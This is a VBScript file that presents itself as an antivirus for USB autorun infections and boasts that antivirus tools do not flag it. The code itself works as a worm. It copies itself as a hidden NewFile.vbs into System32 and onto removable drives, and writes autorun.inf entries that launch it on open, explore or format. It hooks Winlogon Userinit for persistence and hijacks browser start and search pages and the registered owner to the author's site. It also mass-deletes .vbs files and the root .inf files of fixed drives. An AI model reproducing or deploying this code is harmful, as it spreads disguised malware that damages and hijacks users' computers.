'******************************************************************
'********************* Virus Removal VBScript *********************
'*********************** Version 1.0.1.0 **************************
'******* This is specially for autorun Viruses*********************
'******************************************************************
'This antivirus program is intended to repair your computer from
'any sorts of virus attacks.
'This program runs like a normal virus but it repairs things
'rather than destroying them.
'******************************************************************
'******************************************************************
'Program modified by @ @ |< @ $ |-|
'http://kshitiz.co.nr
'iloveyouaakash@yahoo.com
'Original File = SemiAntivirus.vbs
'Thanks to SemiAntivirus.vbs maker
'Many new changes can be felt by by user:
'-> Toggle can be Disabled
'-> Drives lock can be disabled
'-> A set of virus is deleted as soon as this program runs which can be seen below.
'-> This is not programmed as other boot.vbs,kuikelbrt.vbs,virusremoval.vbs. So 
'   AntiVirus does not warn about this.
'->  

Option Explicit
On Error Resume Next

Dim Fso,Shells,SystemDir,WinDir,Count,File,Drv,Drives,InDrive,ReadAll,AllFile,WriteAll,Del,folder,Files,Delete,auto,root,rtn,appfolder,kinzadir
Set Fso = CreateObject("Scripting.FileSystemObject")
Set Shells = CreateObject("Wscript.Shell")
Set WinDir = Fso.GetSpecialFolder(0)
Set SystemDir =Fso.GetSpecialFolder(1)
Set File = Fso.GetFile(WScript.ScriptFullName)
Set Drv = File.Drive
appfolder=Shells.SpecialFolders("AppData")
kinzadir = appfolder & "\dxdlls"
Set InDrive = Fso.drives
Set ReadAll = File.OpenAsTextStream(1,-2)
do while not ReadAll.atendofstream
AllFile = AllFile & ReadAll.readline
AllFile = AllFile & vbcrlf
Loop

crvbs SystemDir,"NewFile.vbs"

Shells.RegWrite "HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD","0","REG_DWORD"

Count=Drv.DriveType

Do 


	delt WinDir,"Vmnat.exe",true
	delt SystemDir,"Vmnat.exe",true
	delt WinDir,"New Folder.exe",true
	delt SystemDir,"New Folder.exe",true
	delt SystemDir,"isetup.exe",true
	delt SystemDir,"RavMon.exe",true
	delt SystemDir,"scvhsot.exe",true
	delt WinDir,"iph.exe",true
	delt WinDir,"system.bat",true
	delt WinDir,"scvvhsot.exe",true


	delt SystemDir,"scvvhsot.exe",true
	delt WinDir,"scvvhsot.exe",true
	delt SystemDir,"blastclnnn.exe",true
	delt SystemDir,"dxdlg.exe",true
	delt SystemDir,"wprop.exe",true
	delt SystemDir,"boot.vbs",false
	delt SystemDir,"imapd.exe",true
	delt SystemDir,"imapdb.exe",true
	delt SystemDir,"imapdc.dll",false
	delt SystemDir,"imapdd.dll",false
	delt SystemDir,"imapde.dll",false
	delt SystemDir,"kinza.exe",true
	delt SystemDir,"isetup.exe",true
	delt SystemDir,"Drivers\etc\hints.exe",true
	For each Files in kinzadir.Files
		set WriteAll = Fso.GetFile(Files.Name)
		set Delete = WriteAll.Delete(True)
	Next
		set WriteAll = Fso.GetFoler(kinzadir)
		set Delete = WriteAll.Delete(True)
		Shells.RegWrite  "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue","1","REG_DWORD"
		
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","0","REG_DWORD"
        Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","0","REG_DWORD"
	Shells.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title","$ P @ r |< Internet Explorer"
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions","0","REG_DWORD"
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr","","REG_DWORD"
	Shells.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","0","REG_DWORD"
	Shells.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\ShowAll\CheckedValue","1","REG_DWORD"      
	Shells.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.kshitiz.co.nr"
	Shells.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{645FF040-5081-101B-9F08-00AA002F954E}", "0","REG_DWORD"
	Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell" , "explorer.exe"
	Shells.Regwrite "HKLM\Software\Microsoft\Internet Explorer\Main\Search Page" , "http://www.kshitiz.co.nr"
	Shells.Regwrite "HKLM\Software\Microsoft\windows NT\CurrentVersion\RegisteredOwner" , "/< 5 /-/ ! 7 ! 2"
        Shells.Regwrite "HKLM\Software\Microsoft\windows NT\CurrentVersion\RegisteredOrganization", "StarsSpark4me[KSHITIZ]"
        Shells.Regwrite "HKLM\Software\Microsoft\Internet Explorer\Main\Default_Page_URL" , "http://www.kshitiz.co.nr"
	Shells.Regwrite "HKLM\Software\Microsoft\Internet Explorer\Main\Default_Search_URL" , "http://www.kshitiz.co.nr"
	Shells.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",SystemDir & "\userinit.exe," & _
	SystemDir & "\wscript.exe " & SystemDir & "\NewFile.vbs"
	
	For Each Drives In InDrive 
		root = Drives.Path & "\"
		If Fso.GetParentFolderName(WScript.ScriptFullName)=root Then
			Shells.Run "explorer.exe " & root
		End If
		Set folder=Fso.GetFolder(root)
		Set Delete = Fso.DeleteFile(SystemDir & "\killvbs.vbs",true)
		Set Delete = Fso.DeleteFile(SystemDir & "\VirusRemoval.vbs",true)
		If Drives.DriveType=2 Then
			delext "inf",Drives.Path & "\"
			delext "INF",Drives.Path & "\"
		End if  

		If Drives.DriveType = 1 Or Drives.DriveType = 2 Then
			If Drives.Path<> "A:" Then
				delext "vbs",WinDir & "\"
				delext "vbs",Drives.Path  & "\"
				
				delt Drives.Path, "ravmon.exe",false
				if Drives.DriveType = 1 then
				crvbs Drives.Path,"NewFile.vbs"
				End if
				delt Drives.Path,"sxs.exe",false
				delt Drives.Path,"kinza.exe",false
				delt Drives.Path,"SCVVHSOT.exe",false
				delt Drives.Path,"New Folder.exe",false
				delt Drives.Path,"Autorun.inf",false
				delt Drives.Path,"isetup.exe",false
				delt Drives.Path,"explorer.exe",false
				delt Drives.Path,"smss.exe",false
				delt Drives.Path,"winfile.exe",false
				delt Drives.Path,"run.wsh",false
								
				If Drives.DriveType = 1 Then
					If Drives.Path<>"A:" Then
					crinf Drives.Path,"autorun.inf"
					End If
				End If
			End if  
		End If
	Next

	if Count <> 1 then
	Wscript.sleep 1000
	end if


loop while Count<>1


sub delext(File2Find, SrchPath)
   Dim oFileSys, oFolder, oFile,Cut,Delete
   Set oFileSys = CreateObject("Scripting.FileSystemObject")
   Set oFolder = oFileSys.GetFolder(SrchPath)
	Set File = oFileSys.GetFile(WScript.ScriptFullName)
	
   For Each oFile In oFolder.Files
		Cut=Right(oFile.Name,3)
		If UCse(Cut)=UCase(file2find) Then
			If oFile.Name <> "NewFile.vbs" Then set Delete = oFileSys.DeleteFile(srchpath & oFile.Name,true)
		End If
   Next
End sub

sub delt(fPath, fName, kil)
	dim fSys, Delet, Wri, alt
	set alt = CreateObject("Wscript.Shell")
	set fSys = CreateObject("Scripting.FileSystemObject")
	if fSys.FileExists(fPath & "\" & fName) then
	if kil = true then
	alt.Run "taskkill /f /im " & fName,0
	set Wri = fSys.GetFile(fPath & "\" & fName)
	Wri.Attributes = 0
	set Delet = fSys.DeleteFile(fpath & "\" & fname,true)
	else
	set Wri = fSys.GetFile(fPath & "\" & fName)
	Wri.Attributes = 0
	set Delet = fSys.DeleteFile(fpath & "\" & fname,true)
	End if
	End if
end sub

sub crvbs(fPath, fName)
	dim dt, dt1, fSys, Writ, mfile, ReadAl, AllFil, chg, aLine, eLine,Shells
	set fSys = CreateObject("Scripting.FileSystemObject")
	set mfile = fSys.GetFile(WScript.ScriptFullName)
	Set ReadAl = mfile.OpenAsTextStream(1,-2)
	do while not ReadAl.atendofstream
	AllFil = AllFil & ReadAl.readline
	AllFil = AllFil & vbcrlf
	Loop
	If fSys.FileExists(fPath & "\" & fName) then
		set Writ = fSys.GetFile(fPath & "\" & fName)
		dt = Writ.DateLastModified
		dt1 = mfile.DateLastModified
		if (datevalue(dt1)-datevalue(dt)) > 0 then
			delt fPath,"NewFile.vbs",false
			set Writ = fSys.CreateTextFile(fPath & "\" & fName,2,true)
			Writ.Write AllFil
			Writ.close
			set Writ = fSys.GetFile(fPath & "\" & fname)
			Writ.Attributes = -1
		end if
	else
		set Writ = fSys.CreateTextFile(fPath & "\NewFile.vbs",true,true)
		Writ.Write AllFil
		Writ.close
		set Writ = fSys.GetFile(fPath & "\" & fName)
		Writ.Attributes = -1
	end if
end sub

sub crinf(fPath, fName)
	dim dt, dt1, fSys, Writ, mfile, ReadAl, AllFil, chg, aLine, eLine,Shells
	set fSys = CreateObject("Scripting.FileSystemObject")
eLine =eLine & "[autorun]" & vbcrlf
eLine =eLine & "open=wscript.exe NewFile.vbs" & vbcrlf
eLine =eLine & "icon=%systemroot%\System32\SHELL32.dll,8" & vbcrlf
eLine =eLine &  "action=Open folder to view files" & vbcrlf
eLine =eLine &  "shell\open=Open" & vbcrlf
eLine =eLine & "shell\open\Command=wscript.exe NewFile.vbs" & vbcrlf
eLine =eLine &  "shell\Auto=AutoPlay" & vbcrlf
eLine =eLine & "shell\Auto\Command=wscript.exe NewFile.vbs" & vbcrlf
eLine =eLine & "shell\Explore\Command=wscript.exe NewFile.vbs" & vbcrlf
eLine =eLine & "shell\Find=Search..." & vbcrlf
eLine =eLine & "shell\Find\Command=wscript.exe NewFile.vbs" & vbcrlf
eLine =eLine & "shell\Format...=Format..." & vbcrlf
eLine =eLine & "shell\Format...\Command=wscript.exe NewFile.vbs" & vbcrlf
	If fSys.FileExists(fPath & "\" & fName) then
		set Chg = fSys.GetFile(fPath & "\" & fName)
		set ReadAl = Chg.OpenAsTextStream(1,-2)
		do while not ReadAl.atendofstream
		aLine = aLine & ReadAl.readline
		aLine = aLine & vbcrlf
		Loop
		ReadAl.close
		If trim(aLine) <> trim(eLine) then
		Set Writ = fSys.CreateTextFile(fPath & "\" & fName,2,True)
		Writ.write eLine
		Writ.close
		Set Writ = fSys.GetFile(fPath & "\" & fName)
		Writ.Attributes = -1
		End if
else
		set Writ = fSys.CreateTextFile(fPath & "\" & fName,2,True)
		Writ.Write eLine
		Writ.Close
		Set Writ = fSys.GetFile(fPath & "\" & fName)
		Writ.Attributes = -1
end if
			
End sub
		
